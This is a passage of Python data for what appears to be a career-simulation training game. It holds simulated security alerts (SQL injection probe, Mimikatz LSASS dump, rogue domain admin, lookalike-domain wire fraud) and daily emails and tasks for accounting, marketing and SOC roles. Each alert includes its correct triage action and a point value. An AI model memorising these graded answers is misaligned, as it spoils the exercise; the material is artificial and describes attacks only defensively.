        {"id":"ALERT-2026-0221-003","timestamp":"2026-02-21T10:45:12Z","severity":"CRITICAL","confidence":89,"source":"WAF","source_detail":"Cloudflare","title":"SQL injection probe matching active CVE","description":"Probe targeting CVE-2026-1811 against customer-portal API.","details":"15 requests with payload variations of CVE-2026-1811 (auth-bypass) against /api/v2/account.","src_ip":"103.78.221.40","src_host":"(external — SQLi source)","src_user":"-","dst_ip":"203.0.113.55","dst_geo":"Edge","dst_reputation":"Public-facing API","affected_asset":"customer-portal.shieldwall.io","mitre_tactic":"Initial Access","mitre_technique":"T1190","mitre_name":"Exploit Public-Facing Application","status":"open","triage_status":"unreviewed","sla_hours":1,"is_real_threat":True,"threat_type":"web_exploit","correct_action":"escalate","points":20,"playbook":"IR-WEB-001: Active CVE Probe","playbook_steps":["Confirm WAF blocking — verify rule is active","Patch status: is the underlying app patched?","Pull access logs for any 2xx responses to suspicious payloads","Notify product team — coordinate emergency patch if needed"],"raw_log":"Feb 21 10:45:12 cloudflare action=block rule=cve-2026-1811-sqli src=103.78.221.40 path=/api/v2/account count=15","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0221-004","timestamp":"2026-02-21T13:21:45Z","severity":"LOW","confidence":40,"source":"NIDS","source_detail":"Suricata","title":"Port scan detected from internal scanner","description":"Wide port scan from 10.0.10.5 — known authorised vuln scanner.","details":"Standard weekly Tenable Nessus scan — full port range across the corporate range. Expected on Wednesdays.","src_ip":"10.0.10.5","src_host":"NESSUS-01","src_user":"-","dst_ip":"10.0.0.0/16","dst_geo":"Internal","dst_reputation":"Internal sanctioned scanner","affected_asset":"Corporate network","mitre_tactic":"Discovery","mitre_technique":"T1046","mitre_name":"Network Service Discovery","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":False,"threat_type":"sanctioned_scan","correct_action":"resolve","points":6,"playbook":"IR-NET-009: Internal Scan","playbook_steps":["Verify against vuln-mgmt schedule","Confirm scanner identity","Close as expected"],"raw_log":"Feb 21 13:21:45 suricata src=10.0.10.5 sig=ET-SCAN-Nessus dst_count=2348 dst_ports=1-65535","analyst_notes":"","false_positive_indicators":"Scanner is registered in the asset DB (NESSUS-01). Weekly Wednesday window 13:00–15:00 is approved."},
        {"id":"ALERT-2026-0221-005","timestamp":"2026-02-21T16:08:57Z","severity":"HIGH","confidence":76,"source":"DLP","source_detail":"Microsoft Purview","title":"Bulk customer export downloaded by departing employee","description":"d.thomas (notice period ends Friday) exported 12,400 customer rows from CRM.","details":"User downloaded full customer list from Salesforce report — far above their normal export volume.","src_ip":"10.0.6.55","src_host":"DEV-LAPTOP-21","src_user":"d.thomas","dst_ip":"-","dst_geo":"-","dst_reputation":"-","affected_asset":"Salesforce customer DB","mitre_tactic":"Collection","mitre_technique":"T1213","mitre_name":"Data from Information Repositories","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"insider_data_theft","correct_action":"escalate","points":17,"playbook":"IR-INS-001: Departing Employee Data","playbook_steps":["Pause user access without alerting them","Pull download history for past 30 days","Coordinate with HR/Legal","Check whether user has personal cloud storage configured"],"raw_log":"Feb 21 16:08:57 purview rule=BULK-CRM-EXPORT user=d.thomas records=12400 normal_avg=240","analyst_notes":"","false_positive_indicators":None},
    ],
    5: [
        {"id":"ALERT-2026-0222-001","timestamp":"2026-02-22T02:55:18Z","severity":"CRITICAL","confidence":96,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"Domain controller — Mimikatz signature","description":"Mimikatz lsass.exe access pattern on DC-01.","details":"Process from C:\\Users\\Public\\m.exe accessed lsass.exe with PROCESS_VM_READ — classic Mimikatz pattern. DC-01 is a domain controller.","src_ip":"10.0.0.10","src_host":"DC-01","src_user":"adm_backup","dst_ip":"-","dst_geo":"Internal","dst_reputation":"-","affected_asset":"Domain Controller","mitre_tactic":"Credential Access","mitre_technique":"T1003.001","mitre_name":"OS Credential Dumping: LSASS Memory","status":"open","triage_status":"unreviewed","sla_hours":1,"is_real_threat":True,"threat_type":"credential_dump","correct_action":"escalate","points":25,"playbook":"IR-CRED-001: LSASS Dump on DC","playbook_steps":["P0 incident — wake CISO","Force domain-wide krbtgt rotation (twice, 12h apart)","Reset adm_backup credentials","Forensic image DC-01 before any remediation","Assume tier-0 compromise until proven otherwise"],"raw_log":"Feb 22 02:55:18 cs_falcon host=DC-01 proc=C:\\Users\\Public\\m.exe target=lsass.exe access=PROCESS_VM_READ user=adm_backup","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0222-002","timestamp":"2026-02-22T06:14:33Z","severity":"HIGH","confidence":81,"source":"SIEM","source_detail":"Splunk","title":"New domain admin account created at 03:11Z","description":"Account 'svc_helpdesk_x' added to Domain Admins by adm_backup overnight.","details":"User adm_backup added a new account svc_helpdesk_x (created 02:58Z) to Domain Admins at 03:11Z. No change ticket exists.","src_ip":"10.0.0.10","src_host":"DC-01","src_user":"adm_backup","dst_ip":"-","dst_geo":"Internal","dst_reputation":"-","affected_asset":"Active Directory","mitre_tactic":"Persistence","mitre_technique":"T1136.002","mitre_name":"Create Account: Domain Account","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"persistence","correct_action":"escalate","points":20,"related_alerts":["ALERT-2026-0222-001"],"playbook":"IR-PERS-002: Rogue Domain Admin","playbook_steps":["Disable svc_helpdesk_x and remove from Domain Admins","Audit DA membership end-to-end","Check ServicePrincipalName changes in last 7 days","Tie to LSASS dump investigation"],"raw_log":"Feb 22 03:11:08 dc-01 sec_event_id=4728 actor=adm_backup target=svc_helpdesk_x group=\"Domain Admins\"","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0222-003","timestamp":"2026-02-22T09:42:09Z","severity":"MEDIUM","confidence":48,"source":"NIDS","source_detail":"Suricata","title":"Beaconing pattern to research-lab IP","description":"Regular 60s beacons from RES-LAB-04 to a known sandbox IP.","details":"Steady 60s-interval beacons over 4h to 198.51.100.12 — matches malware sandbox VM that the research team operates.","src_ip":"10.0.12.18","src_host":"RES-LAB-04","src_user":"k.tanaka","dst_ip":"198.51.100.12","dst_geo":"Internal-routed lab","dst_reputation":"Sanctioned sandbox","affected_asset":"Research lab host","mitre_tactic":"Command and Control","mitre_technique":"T1071","mitre_name":"Application Layer Protocol","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":False,"threat_type":"benign_research","correct_action":"resolve","points":8,"playbook":"IR-NET-007: Beaconing Triage","playbook_steps":["Cross-check destination IP against asset DB","Confirm with research team","Close as sanctioned and document baseline"],"raw_log":"Feb 22 09:42:09 suricata src=10.0.12.18 dst=198.51.100.12 interval=60s duration=4h proto=https","analyst_notes":"","false_positive_indicators":"198.51.100.12 is the research team's sandbox VM (asset RES-SBX-01). Interval matches their telemetry agent."},
        {"id":"ALERT-2026-0222-004","timestamp":"2026-02-22T12:30:44Z","severity":"HIGH","confidence":74,"source":"Email Gateway","source_detail":"Proofpoint","title":"BEC attempt: CEO impersonation, wire transfer","description":"Email from 'Alex Kim' (real CEO) to CFO requesting £210k wire to new vendor.","details":"Sender domain is shieIdwall.io (capital I masquerading as l). Subject 'Urgent — confidential acquisition wire'. CFO is on holiday.","src_ip":"-","src_host":"-","src_user":"alex.kim@shieIdwall.io","dst_ip":"-","dst_geo":"-","dst_reputation":"Lookalike","affected_asset":"CFO mailbox","mitre_tactic":"Initial Access","mitre_technique":"T1566.002","mitre_name":"Spearphishing Link","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"bec","correct_action":"escalate","points":17,"playbook":"IR-BEC-001: CEO Wire Fraud","playbook_steps":["Pull message from CFO mailbox before they read it","Confirm with real CEO via voice (NOT email)","Block lookalike domain","Notify finance — no wires until verified","Add example to staff awareness next week"],"raw_log":"Feb 22 12:30:44 proofpoint header_from=\"Alex Kim <alex.kim@shieIdwall.io>\" envelope_from=alex@randommail.tk subject=\"Urgent — confidential acquisition wire\"","analyst_notes":"","false_positive_indicators":None},
        {"id":"ALERT-2026-0222-005","timestamp":"2026-02-22T15:17:01Z","severity":"LOW","confidence":28,"source":"Web Proxy","source_detail":"Zscaler","title":"User accessed gambling site during work hours","description":"User browsed two gambling sites for 12 minutes total.","details":"Acceptable-use policy violation. Not a security threat — flagged for HR awareness.","src_ip":"10.0.7.31","src_host":"MKT-LAPTOP-08","src_user":"p.dawson","dst_ip":"-","dst_geo":"-","dst_reputation":"Gambling category","affected_asset":"Marketing laptop","mitre_tactic":"-","mitre_technique":"-","mitre_name":"Acceptable Use","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":False,"threat_type":"aup_violation","correct_action":"resolve","points":5,"playbook":"IR-AUP-001: Acceptable Use","playbook_steps":["Tag and forward to HR per policy","Do not personally engage user","Close ticket"],"raw_log":"Feb 22 15:17:01 zscaler user=p.dawson category=gambling sites=2 duration=12m action=allowed","analyst_notes":"","false_positive_indicators":"Not a security event — AUP issue, HR territory."},
    ],
}

# ── UNIFIED DAY PACKS (Days 2–5) for non-cyber careers ───────────
# Each entry is keyed by career → day → dict of collection-specific items.
# Supported sub-keys: "emails", "tasks", "invoices", "jira", "campaigns".
# /api/advance_day inserts these into their respective collections tagged
# with day=N. Endpoints below filter by day <= current_day.
_DAY_PACKS: dict[str, dict[int, dict]] = {
    "accountant": {
        2: {
            "emails": [
                {"id":"acc-d2-e1","from_name":"Sarah Mitchell","from_role":"Finance Manager","from_email":"sarah@apexfinancial.com","subject":"Yesterday's rec — couple of follow-ups","body":"Morning,\n\nNice work on the bank rec. Two things to tighten up today:\n1. The £600 Crawford VAT line — I want a credit note posted before noon so we can release the invoice.\n2. Post the adjusting journals for the March discrepancies. I need a clean trial balance by 3pm for the board pack.\n\nAlso — pull April YTD revenue when you get a minute.\n\nSarah","time":"08:30","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"acc-d2-e2","from_name":"Liam Okafor","from_role":"Supplier — NovaPrint","from_email":"ar@novaprint.co.uk","subject":"Invoice NP-7842 — payment overdue 14 days","body":"Dear Accounts,\n\nNP-7842 (£3,420 for March print run) is now 14 days past due. Could you confirm the payment date? Our credit control will start formal recovery on Friday otherwise.\n\nKind regards,\nLiam Okafor — NovaPrint AR","time":"09:05","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
            ],
            "tasks": [
                {"id":"acc-d2-t1","title":"Post Crawford VAT credit note","description":"£600 credit against INV-4821 — line is VAT-exempt service.","priority":"high","deadline":"12:00","status":"pending","points":15},
                {"id":"acc-d2-t2","title":"Reconcile NovaPrint NP-7842","description":"Check whether invoice was approved for payment and locate hold reason.","priority":"high","deadline":"15:00","status":"pending","points":15},
                {"id":"acc-d2-t3","title":"Pull April YTD revenue snapshot","description":"Sage > P&L > YTD April. Email to Sarah by 17:00.","priority":"medium","deadline":"17:00","status":"pending","points":10},
            ],
            "invoices": [
                {"id":"INV-4905","client":"NovaPrint Ltd","amount":3420.00,"po":"PO-NP-211","po_amount":3420.00,"date":"2026-03-02","status":"queried","notes":"AR chasing — confirm payment release"},
                {"id":"INV-4906","client":"Helix Logistics","amount":8200.00,"po":"PO-HL-118","po_amount":8200.00,"date":"2026-03-02","status":"open","notes":"Routine — standard 30-day terms"},
            ],
        },
        3: {
            "emails": [
                {"id":"acc-d3-e1","from_name":"Marcus Hayes","from_role":"Finance Director","from_email":"marcus@apexfinancial.com","subject":"Audit prep — pull these by Friday","body":"Hi,\n\nExternal auditors (BDO) arrive Monday. I need the following packs ready by EOD Friday:\n\n• Bank rec March + April (signed)\n• Fixed-asset register — additions and disposals YTD\n• Intercompany schedule with Apex Ireland\n• Top-20 accruals with backup\n\nSarah will quality-check before I sign off. Don't surprise me at the last minute.\n\nMarcus","time":"08:15","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
                {"id":"acc-d3-e2","from_name":"Sarah Mitchell","from_role":"Finance Manager","from_email":"sarah@apexfinancial.com","subject":"Quick win — supplier statement reconciliations","body":"Found 3 supplier statements with mismatches against our ledger:\n• Pinewood Supplies — £840 difference (their favour)\n• CloudHost Ltd — £120 in our favour\n• Premier Couriers — £56 our favour\n\nReconcile by EOD and send me a summary. Easy points if you spot which one is a duplicate posting on our side.\n\nSarah","time":"10:00","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
            ],
            "tasks": [
                {"id":"acc-d3-t1","title":"Pull audit pack — March/April bank rec","description":"Two signed bank recs for BDO. Save to SharePoint/Audit/2026/Q1.","priority":"high","deadline":"Friday 17:00","status":"pending","points":20},
                {"id":"acc-d3-t2","title":"Intercompany match — Apex Ireland","description":"Reconcile £127k IC balance. Find the offset for the £4,200 Q1 management fee.","priority":"high","deadline":"Friday 17:00","status":"pending","points":18},
                {"id":"acc-d3-t3","title":"Resolve 3 supplier statement diffs","description":"Pinewood/CloudHost/Premier — see Sarah's note.","priority":"medium","deadline":"17:00","status":"pending","points":12},
            ],
            "invoices": [
                {"id":"INV-4910","client":"Apex Ireland (IC)","amount":4200.00,"po":"IC-Q1-MGT","po_amount":4200.00,"date":"2026-03-03","status":"queried","notes":"Intercompany — confirm management fee recharge"},
                {"id":"INV-4911","client":"BDO Audit Services","amount":9800.00,"po":"PO-BDO-26","po_amount":9800.00,"date":"2026-03-03","status":"open","notes":"Audit retainer — accrue if not paid by month-end"},
            ],
        },
        4: {
            "emails": [
                {"id":"acc-d4-e1","from_name":"Marcus Hayes","from_role":"Finance Director","from_email":"marcus@apexfinancial.com","subject":"Variance commentary — gross margin slide","body":"Gross margin dropped 180bps vs Feb. Board will ask. I need a one-paragraph commentary explaining the drivers by 11am tomorrow. Don't write fluff — three concrete drivers max, supported by numbers from the P&L.\n\nMarcus","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"acc-d4-e2","from_name":"James Crawford","from_role":"Procurement Director","from_email":"j.crawford@crawfordandsons.co.uk","subject":"Confirmation — INV-4821 credit received, thanks","body":"Confirmed credit £600 against INV-4821 — payment now released for the net £11,800. Appreciate the quick turnaround.\n\nJames","time":"09:20","read":False,"replied":False,"priority":"low","category":"client","requires_action":False},
                {"id":"acc-d4-e3","from_name":"Payroll Bureau","from_role":"External Payroll","from_email":"payroll@apexpayrollbureau.co.uk","subject":"March payroll cutoff — final headcount","body":"Final cutoff for March is 17:00 today. Please confirm:\n• New starter J. Patel (start date 2026-03-12) — add\n• Leaver D. Thomas (last day 2026-03-29) — remove\n• Bonus run for Sales (5 staff, £12,400 total) — process\n\nReply yes/no to each line.","time":"10:45","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
            ],
            "tasks": [
                {"id":"acc-d4-t1","title":"Draft GM variance commentary","description":"3 drivers, numbers from P&L, one paragraph. Send Marcus by 11:00 tomorrow.","priority":"high","deadline":"tomorrow 11:00","status":"pending","points":18},
                {"id":"acc-d4-t2","title":"Confirm March payroll changes","description":"Reply to bureau — starter/leaver/bonus run.","priority":"high","deadline":"17:00","status":"pending","points":12},
                {"id":"acc-d4-t3","title":"AR aging review — 60+ day debtors","description":"Pull aged-debt report. Flag any client over £5k to Sarah.","priority":"medium","deadline":"17:00","status":"pending","points":10},
            ],
            "invoices": [
                {"id":"INV-4915","client":"GrandView Retail","amount":18400.00,"po":"PO-GV-441","po_amount":18400.00,"date":"2026-01-15","status":"queried","notes":"75 days overdue — finance to chase or escalate to credit control"},
                {"id":"INV-4916","client":"Boltline Engineering","amount":2950.00,"po":"PO-BE-019","po_amount":2950.00,"date":"2026-03-04","status":"open","notes":"Routine"},
            ],
        },
        5: {
            "emails": [
                {"id":"acc-d5-e1","from_name":"Marcus Hayes","from_role":"Finance Director","from_email":"marcus@apexfinancial.com","subject":"Month-end pack — final review at 14:00","body":"I'm sitting down with the pack at 14:00. By then I need:\n\n1. P&L with variance vs budget AND vs prior month\n2. Balance sheet (balanced — please)\n3. Cashflow statement\n4. Three KPIs the board cares about: GM%, DSO, OPEX run-rate\n\nIf any number changes after 14:00 you owe me a coffee.\n\nMarcus","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"acc-d5-e2","from_name":"Sarah Mitchell","from_role":"Finance Manager","from_email":"sarah@apexfinancial.com","subject":"Year-end planning kicks off Monday","body":"Heads up — year-end planning starts Monday. I'll need you to:\n• Refresh the close calendar\n• Draft the year-end timetable for review\n• Pull the prior-year audit adjustments list\n\nNothing urgent today — but block 90 minutes Monday morning.\n\nSarah","time":"09:30","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
                {"id":"acc-d5-e3","from_name":"BDO Audit","from_role":"External Auditor","from_email":"j.lewis@bdo.co.uk","subject":"Pre-audit checklist — confirm receipt","body":"Hi,\n\nConfirmation we'll be on site Monday 09:00. Pre-audit checklist attached — please confirm by EOD today that all items are in the data room:\n\n1. Signed bank recs ✓\n2. Fixed-asset register\n3. Intercompany schedule\n4. Top-20 accruals with backup\n5. Revenue recognition memo (Q1 SaaS deals)\n\nJ. Lewis — BDO","time":"10:15","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
            ],
            "tasks": [
                {"id":"acc-d5-t1","title":"Finalise month-end pack","description":"P&L, BS, CF, 3 KPIs — Marcus at 14:00. Zero last-minute changes.","priority":"high","deadline":"14:00","status":"pending","points":25},
                {"id":"acc-d5-t2","title":"Confirm BDO data-room checklist","description":"All 5 items ticked. Reply to J. Lewis.","priority":"high","deadline":"17:00","status":"pending","points":15},
                {"id":"acc-d5-t3","title":"Draft year-end timetable","description":"Skeleton for Monday review. Use prior year as template.","priority":"low","deadline":"Monday 09:00","status":"pending","points":10},
            ],
            "invoices": [
                {"id":"INV-4920","client":"Internal — Q1 SaaS recognition","amount":48000.00,"po":"REV-Q1-SAAS","po_amount":48000.00,"date":"2026-03-05","status":"open","notes":"Revenue cut-off — confirm recognition profile (3 deals, 12-month)"},
            ],
        },
    },
    "marketing": {
        2: {
            "emails": [
                {"id":"mkt-d2-e1","from_name":"Priya Sharma","from_role":"Head of Marketing","from_email":"priya@brightpath.io","subject":"Day-1 numbers — what's the variant call?","body":"Hi,\n\nNovaTech LinkedIn is 24h in. Variant B is +23% CTR over A but conversions are noisier. What's your call — declare winner, or run another 48h for significance?\n\nDon't pause both before answering. The exec deck Friday needs a decision.\n\nPriya","time":"08:20","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"mkt-d2-e2","from_name":"@MayaCreates","from_role":"Creator partner","from_email":"hi@mayacreates.co","subject":"Re: NovaTech TikTok — script ready for review","body":"Hey! Draft script for the 60s POV is in the shared doc. Couple of brand-tone questions: can I say 'kills' (as in 'this kills the old way')? Or do you want me to soften to 'replaces'? Need your call by EOD to film tomorrow.\n\nMaya","time":"09:45","read":False,"replied":False,"priority":"medium","category":"client","requires_action":True},
            ],
            "tasks": [
                {"id":"mkt-d2-t1","title":"Decide LinkedIn A/B winner","description":"Pick A, B, or extend. Document the lift and confidence level for Priya.","priority":"high","deadline":"15:00","status":"pending","points":18},
                {"id":"mkt-d2-t2","title":"Review Maya's TikTok script","description":"Brand-tone approval. Suggest 1-line tweak if needed.","priority":"medium","deadline":"17:00","status":"pending","points":12},
                {"id":"mkt-d2-t3","title":"Spin up creative for Twitter launch tomorrow","description":"3 thread variants — single tweet, 5-part thread, video-quote tweet.","priority":"medium","deadline":"tomorrow 09:00","status":"pending","points":12},
            ],
            "campaigns": [
                {"id":"camp_010","name":"NovaTech Retargeting — Display","status":"draft","platform":"Google Display","scheduled":"2026-05-13","content":"","brand_colour":"#0D9488","tone":"bold and innovative","budget":2800,"spend":0,"approval_status":"draft","metrics":{"impressions":0,"clicks":0,"ctr":0,"conversions":0}},
            ],
        },
        3: {
            "emails": [
                {"id":"mkt-d3-e1","from_name":"Dan Reed","from_role":"CFO","from_email":"dan@brightpath.io","subject":"ROAS deep-dive — by EOD Thursday","body":"Need a one-page ROAS analysis across all five active NovaTech campaigns. CAC payback by channel. I'm comparing against the £35k Q1 brand budget we just landed.\n\nDan","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"mkt-d3-e2","from_name":"Sam Builds","from_role":"Creator partner","from_email":"sam@sambuilds.dev","subject":"YouTube review — draft cut for approval","body":"8-minute draft is up. Honest review (not a paid puff). One section mentions a competitor by name — let me know if that's a problem before I publish.\n\nSam","time":"11:00","read":False,"replied":False,"priority":"medium","category":"client","requires_action":True},
            ],
            "tasks": [
                {"id":"mkt-d3-t1","title":"ROAS deep-dive for CFO","description":"5 campaigns, payback by channel. One page max.","priority":"high","deadline":"Thursday 17:00","status":"pending","points":22},
                {"id":"mkt-d3-t2","title":"Approve/redline Sam's YouTube cut","description":"Competitor mention — legal grey area. Loop in Priya before publishing.","priority":"high","deadline":"15:00","status":"pending","points":15},
                {"id":"mkt-d3-t3","title":"Mid-flight optimisation — LinkedIn","description":"Apply winning variant. Cut losing ad set.","priority":"medium","deadline":"17:00","status":"pending","points":10},
            ],
            "campaigns": [
                {"id":"camp_011","name":"NovaTech Webinar Promo","status":"scheduled","platform":"LinkedIn+Email","scheduled":"2026-05-18","content":"Live walkthrough + Q&A — 800 registrations target","brand_colour":"#0D9488","tone":"educational","budget":1500,"spend":0,"approval_status":"awaiting_review","metrics":{"impressions":0,"clicks":0,"ctr":0,"conversions":0}},
            ],
        },
        4: {
            "emails": [
                {"id":"mkt-d4-e1","from_name":"Priya Sharma","from_role":"Head of Marketing","from_email":"priya@brightpath.io","subject":"Instagram launch tomorrow — last check","body":"Carousel goes live 09:00 tomorrow. Three things to confirm:\n1. Brand colour applied (it's #0D9488 — NOT the old #14b8a6)\n2. Alt-text on every slide\n3. Caption under 2,200 chars and the link in bio swapped\n\nIf any of these aren't done by 17:00 today, push the launch 24h. Don't ship half-baked.\n\nPriya","time":"08:30","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"mkt-d4-e2","from_name":"Ariana Online","from_role":"Creator partner","from_email":"ariana@arianaonline.tv","subject":"Re-pitch — interested in a different format?","body":"Heard the carousel deal didn't work out. I'd be up for a 4-part Reels series instead at the same total fee — gives you 4x the surface area. If you're keen, let's chat Friday.\n\nAriana","time":"10:30","read":False,"replied":False,"priority":"low","category":"client","requires_action":False},
                {"id":"mkt-d4-e3","from_name":"Legal — Mira Khan","from_role":"In-house Counsel","from_email":"mira@brightpath.io","subject":"Competitor mention in Sam's review","body":"Looked at the YouTube cut. Direct competitor-name OK if claims are factual. If Sam compares feature parity, we need verifiable benchmarks before publish. Send me his sources.\n\nMira","time":"13:15","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
            ],
            "tasks": [
                {"id":"mkt-d4-t1","title":"Instagram launch QA","description":"Brand colour, alt-text, caption, link. Sign off before 17:00.","priority":"high","deadline":"17:00","status":"pending","points":15},
                {"id":"mkt-d4-t2","title":"Get Sam's source data to Legal","description":"Verifiable benchmarks for any feature-parity claim.","priority":"high","deadline":"17:00","status":"pending","points":12},
                {"id":"mkt-d4-t3","title":"Reply to Ariana's re-pitch","description":"Polite, scope a Friday call.","priority":"low","deadline":"tomorrow","status":"pending","points":6},
            ],
            "campaigns": [
                {"id":"camp_012","name":"NovaTech — Reels Re-engage","status":"draft","platform":"Instagram","scheduled":"2026-05-22","content":"4-part Reels (Ariana re-pitch)","brand_colour":"#0D9488","tone":"bold and innovative","budget":1900,"spend":0,"approval_status":"draft","metrics":{"impressions":0,"clicks":0}},
            ],
        },
        5: {
            "emails": [
                {"id":"mkt-d5-e1","from_name":"Priya Sharma","from_role":"Head of Marketing","from_email":"priya@brightpath.io","subject":"Launch week wrap — exec readout Monday","body":"Pull together a launch-week wrap by Monday 09:00:\n• Top-line impressions/clicks/conversions by channel\n• Best- and worst-performing creative\n• 3 lessons we'd apply to v3 launch\n• Budget burn vs plan\n\nKeep it to 5 slides. Exec attention span is short.\n\nPriya","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"mkt-d5-e2","from_name":"Dan Reed","from_role":"CFO","from_email":"dan@brightpath.io","subject":"Q2 budget reforecast — channel mix","body":"After this launch, I want a channel-mix recommendation for Q2. Where would we get the best return if I gave you another £20k? Where would I claw back £5k with minimal pain?\n\nDan","time":"09:45","read":False,"replied":False,"priority":"medium","category":"info","requires_action":True},
            ],
            "tasks": [
                {"id":"mkt-d5-t1","title":"Build launch-week wrap deck","description":"5 slides max. Numbers + 3 lessons. Monday 09:00 deadline.","priority":"high","deadline":"Monday 09:00","status":"pending","points":22},
                {"id":"mkt-d5-t2","title":"Q2 channel-mix proposal for CFO","description":"+£20k allocation, -£5k clawback. Recommendation memo.","priority":"medium","deadline":"Monday","status":"pending","points":18},
                {"id":"mkt-d5-t3","title":"Close out paused campaigns","description":"Archive draft Twitter creative + reconcile spend.","priority":"low","deadline":"17:00","status":"pending","points":8},
            ],
        },
    },
    "cybersecurity": {
        # SIEM alerts come from _CYBER_DAY_PACKS. This pack adds the daily
        # emails+tasks that match the alert progression.
        2: {
            "emails": [
                {"id":"cyb-d2-e1","from_name":"Priya Iyer","from_role":"SOC Lead","from_email":"priya@shieldwall.io","subject":"Yesterday's IOC cross-check — your call?","body":"You confirmed 3 of the 4 IOCs against my notes. Brilliant. The fourth (the 91.214 brute-force IP) — I'm leaning false positive but want your judgement before I close. Read the WAF logs and reply.\n\nPriya","time":"08:30","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"cyb-d2-e2","from_name":"Marcus Lin","from_role":"IT Director","from_email":"marcus@shieldwall.io","subject":"Re: FIN-LAPTOP-12 — was it isolated?","body":"Looking at the morning report, FIN-LAPTOP-12 has SMB activity to internal hosts. If you isolated it yesterday, why am I seeing this? Reply ASAP with the timeline.\n\nMarcus","time":"09:15","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
            ],
            "tasks": [
                {"id":"cyb-d2-t1","title":"Triage Day-2 alerts (5 new)","description":"Macro powershell, TOR exit, impossible travel, DLP, brute-force.","priority":"high","deadline":"17:00","status":"pending","points":40},
                {"id":"cyb-d2-t2","title":"Investigate FIN-LAPTOP-12 lateral movement","description":"Was isolation re-applied? Pull SMB sessions.","priority":"high","deadline":"13:00","status":"pending","points":20},
                {"id":"cyb-d2-t3","title":"Reply to Priya re: brute-force IOC","description":"Read WAF logs, give a call.","priority":"medium","deadline":"15:00","status":"pending","points":10},
            ],
        },
        3: {
            "emails": [
                {"id":"cyb-d3-e1","from_name":"Alex Kim","from_role":"CISO","from_email":"alex@shieldwall.io","subject":"P0 incident — ransomware on FILE-SRV-02","body":"Wake up. Active ransomware on the finance share. Join the bridge: https://meet.shieldwall.io/p0-bridge\n\nYour ONE job for the next 4 hours: triage all incoming alerts. If anything looks related to FILE-SRV-02 or FIN-LAPTOP-12, ESCALATE — don't resolve.\n\nAlex","time":"02:00","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
                {"id":"cyb-d3-e2","from_name":"Priya Iyer","from_role":"SOC Lead","from_email":"priya@shieldwall.io","subject":"Phishing wave — pull all 142 inboxes","body":"Coordinate with Email Admin (Jordan) to purge the sh1eldwall.io phishing wave from all 142 mailboxes. I need confirmation count back by 11:00.\n\nPriya","time":"08:30","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
            ],
            "tasks": [
                {"id":"cyb-d3-t1","title":"P0 ransomware — alert triage during bridge","description":"Stay on alerts. Anything FILE-SRV-02 or FIN-LAPTOP-12 = escalate.","priority":"high","deadline":"12:00","status":"pending","points":35},
                {"id":"cyb-d3-t2","title":"Coordinate phishing purge","description":"142 mailboxes. Confirm with Jordan. Report count.","priority":"high","deadline":"11:00","status":"pending","points":15},
                {"id":"cyb-d3-t3","title":"Update threat-intel feed with DNS tunnel IOCs","description":"Document the *.dnscat.example subdomains seen on FIN-LAPTOP-12.","priority":"medium","deadline":"17:00","status":"pending","points":12},
            ],
        },
        4: {
            "emails": [
                {"id":"cyb-d4-e1","from_name":"Marcus Lin","from_role":"IT Director","from_email":"marcus@shieldwall.io","subject":"AWS access key — who has access to that repo?","body":"You'll see a GuardDuty alert about svc-prod-deploy used from us-west-1. We don't have anything in that region. Find out how the key leaked — Git history, Slack DM, laptop, anywhere. Then we rotate.\n\nMarcus","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"cyb-d4-e2","from_name":"HR — Lana Foster","from_role":"HRBP","from_email":"lana@shieldwall.io","subject":"Confidential — d.thomas exit","body":"D. Thomas is leaving Friday. We just saw a 12,400-row CRM export. Do NOT alert the user. Document the activity and loop me in via Signal before any further action.\n\nLana","time":"16:30","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
            ],
            "tasks": [
                {"id":"cyb-d4-t1","title":"Triage Day-4 alerts (5 new)","description":"IAM key, PsExec, SQLi CVE, internal scan, CRM export.","priority":"high","deadline":"17:00","status":"pending","points":40},
                {"id":"cyb-d4-t2","title":"Investigate IAM key leak path","description":"Git, Slack, laptop. Trail of how svc-prod-deploy ended up in us-west-1.","priority":"high","deadline":"15:00","status":"pending","points":20},
                {"id":"cyb-d4-t3","title":"Quietly document d.thomas activity","description":"Per HR — no alert to user. Signal Lana.","priority":"high","deadline":"17:00","status":"pending","points":15},
            ],
        },
        5: {
            "emails": [
